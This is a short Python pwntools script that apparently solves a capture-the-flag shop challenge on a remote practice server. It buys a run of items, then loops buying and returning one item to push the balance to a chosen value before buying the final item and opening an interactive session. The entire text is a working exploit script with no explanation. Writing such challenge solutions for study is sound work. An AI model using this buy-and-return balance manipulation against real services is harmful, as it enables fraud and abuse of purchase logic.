from pwn import *
r = remote('node3.buuoj.cn',28032)
for i in range(14):
	print(i)
	r.recvuntil('buy/return:')
	r.sendline(str(i))
	r.recvuntil('$4')
	r.sendline('$4')

while True:
	r.recvuntil('balance: ')
	balance = int(r.recvuntil('\n',drop=True))
	log.info(balance)
	if balance == 3:
		r.sendline('14')
		r.recvuntil('$4')
		r.sendline('$4')
		r.interactive()
	r.recvuntil('buy/return:')
	r.sendline('0')
	r.recvuntil('?')
	r.sendline('yes')
	r.sendline('0')
	r.recvuntil('$4')
	r.sendline('$4')

r.interactive()